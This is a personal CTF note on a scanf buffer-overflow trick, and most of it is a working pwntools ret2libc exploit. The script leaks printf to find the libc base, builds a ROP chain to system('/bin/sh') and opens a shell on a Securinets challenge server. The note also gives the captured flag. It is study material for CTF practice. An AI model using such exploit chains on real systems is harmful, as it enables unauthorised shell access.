---
title: "Libc trick (pwn)"
category: "pwn"
subcategory: "stack"
type: "technique"
tags: ["my-notes", "personal", "buffer-overflow", "rop", "checksec", "pwn"]
summary: "With %s you can't use null bytes."
source:
  name: "Personal notes"
origin_path: "pwn/Libc trick.md"
---

#libc #pwn 
With `%s` you can't use null bytes. But with `%[^\n]` you accept everything but newlines. In `do_stuff`, there's a buffer overflow because of `%[^\n]` Then, I added `%c` for the newline character (in *Here's a LIBC* there's another scanf) And the `{size}` is to read a maximum amount of data
#### Reference
PicoCTF `Here's a LIBC`
--> https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Heres_a_LIBC.md

```python
#!/usr/bin/env python3

from pwn import *

context.binary = 'main'
glibc = ELF('libc.so.6', checksec=False)
# io = context.binary.process()
io = remote('pwn.ctf.securinets.tn',5002)

io.recvuntil(b'take this : ')
printf_addr = int(io.recvline().decode(), 16)
io.info(f'printf() address: {hex(printf_addr)}')

glibc.address = printf_addr - glibc.sym.printf
io.success(f'Glibc base address: {hex(glibc.address)}')

offset = 12

rop = ROP([context.binary, glibc])

rop_chain = [
    rop.ret.address,
    rop.rdi.address,
    next(glibc.search(b'/bin/sh')),
    glibc.sym.system,
]

size = len(rop_chain) * 8 + offset

io.send(f'%{size}[^\\n]%c'.encode())
# sleep(1)

io.sendline(flat({offset: rop_chain}))
io.recv()

io.interactive()

# Securinets{NoNeed_f0r_l0ve_wH3n_7ou_C1N_P0p_Sh311s}
```

---

*From your own notes: `pwn/Libc trick.md`*
